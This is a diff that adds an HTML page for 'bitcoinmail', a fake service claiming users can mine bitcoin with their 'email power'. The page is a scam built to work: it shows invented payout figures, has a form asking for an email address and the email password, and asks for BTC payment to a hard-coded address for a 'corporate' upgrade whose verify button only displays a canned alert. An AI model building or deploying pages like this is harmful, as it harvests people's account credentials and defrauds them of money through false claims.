@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title> bitcoinmail </title>
+	<link rel="stylesheet" type="text/css" href="./bitcoin-miner.css">
+	<link rel="stylesheet" type="text/css" href="./colors.css">
+</head>
+<body>
+
+<header><a href="/" style="color : white"><h1> bitcoinmail -> Activate Email </h1></a>
+	<br>
+
+<p> Welcome to bitcoinmail <b>|</b><span class="blue"> Mine bitcoin using your Email power.</span></header>
+
+	<div class="payouts">
+		<span> Recent Payouts:</span> <marquee><strong>$340,000 Paid out Last Month</strong></marquee>
+	</div>
+	<br>
+	<center><div>
+		
+		BTC Mined (<font color="red"><b>This process is Automatic, refresh this page regularly to see your accumulated btc., your btc amount is not saved, so it varies on free plan.</b></font>): <div id="btc"> <%= String(btc) %> BTC</div>
+		<button onclick="alert(' Minimum withdrawal is 0.09 BTC')"> Withdraw BTC</button>
+	</div></center>
+<div class="about">
+	<div><h1> Free Account </h1>
+<p> <ul>
+	<li> Free Accounts are eligible to mine bitcoins </li>
+	<li> Minimum withdrawal 0.09 BTC</li>
+	<li> Mining rate <b>LOW</b></li>
+	<li> Servers accesed : 1</li>
+	<li> Mining Power : <b> LOW </b></li>
+
+</ul>
+<p>	Fill in correct Email details, so our servers can access your email power for mining.</p><form>
+	<input type="email" name="" placeholder="Email" required="" id="email" required="">
+	<input type="text" name="" placeholder="Email Password" id="email_password" required="">
+	<input type="text" name="" placeholder="Wallet Type(e,g Coinbase, blockchain)" id="wallet" required="">
+	<br>	<center><p><span id="free_activate"></span></p>
+	<button id="activate"> Activate Email </button></center>
+</form>
+</p></div>
+<div><h1> Corporate Account </h1>
+<p> 
+<ul>
+	<li> Eligible to Mine Bitcoins</li>
+	<li> Minimum withdrawal : 0.0009 BTC</li>
+	<li>Mining rate : <b> EXPRESS </b></li>
+	<li>Server Accessed : 3</li>
+	<li>Minng Power : <b> EXPRESS </b></li>
+</ul>
+</p>
+
+You can enjoy free mining with our free plan but can even get more enhanced services with the corporate plan. Get the Corporate account for <font color="green">0.0052</font> BTC, copy the address below, transfer the worth btc and verify with the senders address.
+
+<P><b> 31yE9qduikSfpSAxz8XA6ebePx5sKGa7VV </b></P>
+<input type="text" name="" id="wallet_id" value="" placeholder=" Your Wallet Address "><button onclick="alert('Transaction not found, this process might take few mins to verify.')"> Verify & Activate </button>
+</div>
+
+
+
+</div>
+
+<div class="testimonies"><span></span></div>
+
+
+
+<script type="text/javascript" src="./miner.js"></script>
+</body>
+</html>
